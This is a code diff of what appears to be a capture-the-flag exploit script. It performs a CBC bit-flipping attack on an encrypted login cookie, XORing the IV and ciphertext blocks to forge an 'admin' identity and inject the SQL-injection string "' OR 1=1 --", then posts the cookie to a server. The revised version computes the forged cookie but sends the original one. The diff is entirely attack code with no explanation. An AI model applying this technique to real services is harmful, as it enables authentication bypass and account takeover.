@@ -29,28 +29,29 @@ def login(username, password):
 
 user = 'a'*21
 passw = "bbbbbb"
-
 cookie = login(user, passw)
 
 iv = unhexlify(cookie[:32])
-resto = unhexlify(cookie[32:])
+resto = cookie[32:]
 
-x = xor(iv, f"user/pass:{user[:6]}".encode())  # 16
-x = xor(x, b"user/pass:admin/")
+us = f"user/pass:{user[:6]}"
+iv_x = xor(iv, us.encode())  # 16
+iv_x = xor(iv_x, b"user/pass:admin/")
 
-block1 = resto[:32]
+block1 = unhexlify(resto[:32])
 
-block2 = resto[32:64]
+block2 = unhexlify(resto[32:64])
+
 block2 = xor(block2, (b'a'*15) + b'/')
 block2 = xor(block2, b"' OR 1=1 --     ")
 
-block3 = resto[64:]
+block3 = unhexlify(resto[64:])
 
-res = hexlify(x) + hexlify(block1) + hexlify(block2) + hexlify(block3)
-print(len(res))
+res = hexlify(iv_x) + hexlify(block1) + hexlify(block2) + hexlify(block3)
 
 a = requests.post(url, data={
-    'c': res
+    'c': cookie
 })
 
-print(a.text)
+print(f"cookie: {cookie}", end="\n\n")
+print(f"php: {a.text}")
